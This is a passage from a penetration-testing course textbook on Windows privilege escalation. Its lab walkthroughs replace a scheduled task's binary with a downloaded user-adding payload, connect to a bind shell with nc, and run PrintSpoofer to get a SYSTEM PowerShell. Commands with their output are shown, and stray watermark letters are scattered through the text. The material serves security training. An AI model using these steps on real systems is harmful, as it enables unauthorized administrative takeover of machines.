Unit, we’ll explore Scheduled Tasks and exploits targeting Windows itself to perform privilege
escalation attacks.
16.3.1 Scheduled Tasks
Windows uses the Task Scheduler to execute various automated tasks, such as clean-up
activities or update management. On Windows, they are called Scheduled Tasks, or Tasks, and
are defined with one or more triggers. A trigger is used as a condition, causing one or more
actions to be executed when met. For example, a trigger can be set to a specific time and date, at
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 520
Made in Morocco
Penetration Testing with Kali Linux
startup, at log on, or on a Windows event. An action specifies which program or script to execute.
There are various other possible configurations for a task, categorized in the Conditions, Settings,
and General menu tabs of a task’s property.
For us, three pieces of information are vital to obtain from a scheduled task to identify possible
privilege escalation vectors:
• As which user account (principal) does this task get executed?
• What triggers are specified for the task?
• What actions are executed when one or more of these triggers are met?
The first question helps us understand if abusing the task will eventually lead to privilege
escalation. If the task is executed in the context of our current user, it won’t lead us to elevated
privileges. However, if the task runs as NT AUTHORITY\SYSTEM or as an administrative user, then
y
a successful attack could lead us to privilege escalation.
The second question is important because if the trigger condkition was met in the past, the task
will not run again in the future and therefore, is not a viable target for us. Additionally, if we are in a
week-long penetration test, but the task runs after this time, we should search for another
s
privilege escalation vector. However, we would mention this finding in a penetration testing report
for a client.
o
While the first two questions help us understand if this task is even an option for a privilege
escalation attack, the answer to the third question determines how we can perform the potential
n
privilege escalation. In the majority of cases, we can leverage familiar tactics such as replacing
the binary or placing a missing DLL as we did with services in a previous Learning Unit. While we
don’t have a service binary with sciheduled tasks, we have programs and scripts specified by
actions. z
Let’s walk through an example in which we attempt to elevate our privileges by replacing a binary
D
specified in an action. For this, we’ll connect once again as steve (password
securityIsNotAnOption++++++) to CLIENTWK220 with RDP and start a PowerShell window.
We can view scheduled tasks on Windows with the Get-ScheduledTask810 Cmdlet or the
command schtasks /query.811 We’ll use the latter for this example to review all scheduled tasks
on CLIENTWK220. We enter /fo with LIST as argument to specify the output format as list.
Additionally, we add /v to display all properties of a task.
Once the command is executed, we get a huge amount of output with information about all
scheduled tasks on the system. We should seek interesting information in the Author, TaskName,
Task To Run, Run As User, and Next Run Time fields. In our case, “interesting” means that the
information partially or completely answers one of the three questions above.
PS C:\Users\steve> schtasks /query /fo LIST /v
...
Folder: \Microsoft
810 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-
scheduledtask?view=windowsserver2022-ps
811 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows-server/administration/windows-
commands/schtasks-query
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 521
Made in Morocco
Penetration Testing with Kali Linux
HostName: CLIENTWK220
TaskName: \Microsoft\CacheCleanup
Next Run Time: 7/11/2022 2:47:21 AM
Status: Ready
Logon Mode: Interactive/Background
Last Run Time: 7/11/2022 2:46:22 AM
Last Result: 0
Author: CLIENTWK220\daveadmin
Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In: C:\Users\steve\Pictures
Comment: N/A
Scheduled Task State: Enabled
Idle Time: Disabled
Power Management: Stop On Battery Mode
Run As User: daveadmin
Delete Task If Not Rescheduled: Disabled y
Stop Task If Runs X Hours and X Mins: Disabled
Schedule: Scheduling data is not available in this format.
Schedule Type: One Time Only, Minkute
Start Time: 7:37:21 AM
Start Date: 7/4/2022
s
...
Listing 448 - Display a list of all scheduled tasks on CLIENTWK220
o
Listing 448 shows information about a task named \Microsoft\CacheCleanup. Interestingly, the
task was created by daveadmin and the specified action is to execute BackendCacheCleanup.exe
in the Pictures home directory of steve. In naddition, the times from Last Run Time and Next Run
Time indicate that the task is executed every minute. The task runs as user daveadmin.
i
Since the executable file BackendCacheCleanup.exe is located in a subdirectory of the home
directory of steve, we should havze extensive permissions on it. Let’s check our permissions on
this file with icacls.
D
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
CLIENTWK220\steve:(I)(F)
CLIENTWK220\offsec:(I)(F)
Listing 449 - Display permissions on the executable file BackendCacheCleanup.exe
As expected, we have Full Access (F) permissions, since the executable file is in the home
directory of steve. Now, we can use our binary adduser.exe again to replace the executable file
specified in the action of the scheduled task.
To do so, we’ll start a Python3 web server to serve our cross-compiled file, adduser.exe, and use
iwr to download it to CLIENTWK220. We’ll also copy the original BackendCacheCleanup.exe so
we can restore it after our privilege escalation attack is successful.
PS C:\Users\steve> iwr -Uri http://192.168.119.3/adduser.exe -Outfile
BackendCacheCleanup.exe
PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
Listing 450 - Download and replace executable file BackendCacheCleanup.exe
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 522
Made in Morocco
Penetration Testing with Kali Linux
Once the scheduled task is executed again, dave2 should be created and added to the local
Administrators group. After waiting a minute, we can check if our privilege escalation attack was
successful.
PS C:\Users\steve> net user
User accounts for \\CLIENTWK220
-------------------------------------------------------------------------------
Administrator BackupAdmin dave
dave2 daveadmin DefaultAccount
Guest offsec steve
WDAGUtilityAccount
The command completed successfully.
PS C:\Users\steve> net localgroup administrators y
Alias name administrators
Comment Administrators have complete and unrestricted access to the
k
computer/domain
Members s
-------------------------------------------------------------------------------
Administrator o
BackupAdmin
dave2
n
daveadmin
offsec
The command completed successfully.
i
Listing 451 - Display permissions on the executable file BackendCacheCleanup.exe
z
Listing 451 shows that we successfully replaced the executable file used by the scheduled task to
create an administrative user whose credentials we control. Great!
D
In this section, we leveraged a similar privilege escalation attack as we did in the section “Service
Binary Hijacking”. This time however, we focused on scheduled tasks instead of Windows
services. We learned how to effectively enumerate scheduled tasks and which properties may be
of interest to us. We concluded the section by replacing the executable file and creating the user
dave2, which is a member of the local Administrators group.
16.3.2 Using Exploits
In the previous sections, we attempted to elevate our privileges by searching for sensitive
information on a system or abusing Windows components such as Windows services or
scheduled tasks. In this section, we’ll discuss three different kinds of exploits leading to privilege
escalation and then show one of them in an example.
The first kind is to exploit application-based vulnerabilities. Installed applications on a Windows
system may contain different types of vulnerabilities as we learned in the Module “Locating Public
Exploits”. If these applications run with administrative permissions and we can exploit a
vulnerability that leads to code execution, we can also successfully elevate our privileges.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 523
Made in Morocco
Penetration Testing with Kali Linux
The second kind is to exploit vulnerabilities in the Windows Kernel.812 However, the vulnerability
research and related exploit techniques are, in most cases, quite advanced and require an in-
depth understanding of the Windows operating system. For the purposes of this Module, it is
enough to understand that Windows kernel exploits exist and can be used for privilege escalation.
Before we blindly download and use a kernel exploit, we need to consider that these types of
exploits can easily crash a system. Depending on the rules of engagement of a penetration test,
we may not be allowed to use methods that will potentially disrupt services or systems.
Therefore, we should always have a clear understanding of our limitations, exclusions, and
boundaries in a real-life assessment. These words of caution should not lead us to abstain from
all kernel exploits, but provide us with the correct mindset when working with them.
The last kind is to abuse certain Windows privileges. Non-privileged users with assigned
privileges, such as SeImpersonatePrivilege, can potentially abuse those privileges to perform
privilege escalation attacks. SeImpersonatePrivilege offers the possiybility to leverage a token with
another security context. Meaning, a user with this privilege can perform operations in the
security context of another user account under the right circumstances. By default, Windows
k
assigns this privilege to members of the local Administrators group as well as the device’s LOCAL
SERVICE, NETWORK SERVICE, and SERVICE accounts. Microsoft implemented this privilege to
s
prevent unauthorized users from creating a service or server application to impersonating clients
connecting to it. An example would be Remote Procedure Calls (RPC)813 or named pipes.814
o
Other privileges that may lead to prnivilege escalation are SeBackupPrivilege,
SeAssignPrimaryToken, SeLoadDriver, and SeDebug. In this section, we’ll closely
inspect privilege escalation vectors in the context of SeImpersonatePrivilege.
i
z
In penetration tests, we’ll rarely find standard users with this privilege assigned. However, we’ll
commonly come across thDis privilege when we obtain code execution on a Windows system by
exploiting a vulnerability in an Internet Information Service (IIS)815 web server. In most
configurations, IIS will run as LocalService, LocalSystem, NetworkService, or
ApplicationPoolIdentity,816 which all have SeImpersonatePrivilege assigned. This also applies to
other Windows services.
Before we head into the example, let’s discuss named pipes and how we can use them in the
context of SeImpersonatePrivilege to impersonate a privileged user account.
Named pipes are one method for local or remote Inter-Process Communication817 in Windows.
They offer the functionality of two unrelated processes sharing and transferring data with each
other. A named pipe server can create a named pipe to which a named pipe client can connect via
the specified name. The server and client don’t need to reside on the same system.
812 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Architecture_of_Windows_NT
813 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page
814 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes
815 (IIS, 2022), https://www.iis.net/
816 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities
817 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Inter-process_communication
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 524
Made in Morocco
Penetration Testing with Kali Linux
Once a client connects to a named pipe, the server can leverage SeImpersonatePrivilege to
impersonate this client after capturing the authentication from the connection process. To abuse
this, we need to find a privileged process and coerce it into connecting to a controlled named
pipe. With SeImpersonatePrivilege assigned, we can then impersonate the user account
connecting to the named pipe and perform operations in its security context.
For this example, we’ll use a tool named PrintSpoofer818 created by itm4n, which implements a
variation of the printer bug819 to coerce NT AUTHORITY\SYSTEM into connecting to a controlled
named pipe. We can use this tool in situations where we have code execution as a user with the
privilege SeImpersonatePrivilege to execute commands or obtain an interactive shell as NT
AUTHORITY\SYSTEM.
PEN-300 covers the printer bug in detail. The course provides a technical in-
y
depth explanation of how it works and walks through developing a custom C#
program to exploit it.
k
Now, let’s begin by connecting to the bind shell on ports 4444 on CLIENTWK220 as we did in the
previous sections. We use whoami /priv to display the assigned privileges of dave.
o
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights rneserved.
C:\Users\dave> whoami /priv
whoami /priv i
z
PRIVILEGES INFORMATION
----------------------
D
Privilege Name Description State
============================= ========================================= ========
SeSecurityPrivilege Manage auditing and security log Disabled
SeShutdownPrivilege Shut down the system Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeUndockPrivilege Remove computer from docking station Disabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
Listing 452 - Checking assigned privileges of dave
Listing 452 shows that dave has the privilege SeImpersonatePrivilege assigned. Therefore, we can
attempt to elevate our privileges by using PrintSpoofer. Let’s open another terminal tab on Kali,
download the 64-bit version of this tool, and serve it with a Python3 web server.
kali@kali:~$ wget
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
...
818 (Github, 2020), https://github.com/itm4n/PrintSpoofer
819 (Active Directory Security, 2018), https://adsecurity.org/?p=4056
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 525
Made in Morocco
Penetration Testing with Kali Linux
2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Listing 453 - Downloading PrintSpoofer64.exe and serve it with a Python3 web server
In the terminal tab with the active bind shell, we’ll start a PowerShell session and use iwr to
download PrintSpoofer64.exe from our Kali machine.
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows y
PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile
PrintSpoofer64.exe k
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
Listing 454 - Downloading PrintSpoofer64.exe to CLIENTWK220
s
To obtain an interactive PowerShell session in the context of NT AUTHORITY\SYSTEM with
PrintSpoofer64.exe, we’ll enter powershell.exe aso argument for -c to specify the command we
want to execute and -i to interact with the process in the current command prompt.
n
PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
i
[+] Named pipe listening...
[+] CreateProcessAsUser() OK z
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
D
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Windows\system32> whoami
whoami
nt authority\system
Listing 455 - Using the PrintSpoofer tool to get an interactive PowerShell session in the context of NT
AUTHORITY\SYSTEM.
Listing 455 shows that we successfully performed the privilege escalation attack using
PrintSpoofer, leading us to an interactive PowerShell session in the context of the user account
NT AUTHORITY\SYSTEM. Excellent!
While PrintSpoofer provided us a straightforward exploit process to elevate our privileges, there
are also other tools that can abuse SeImpersonatePrivilege for privilege escalation. Variants from
the Potato820 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We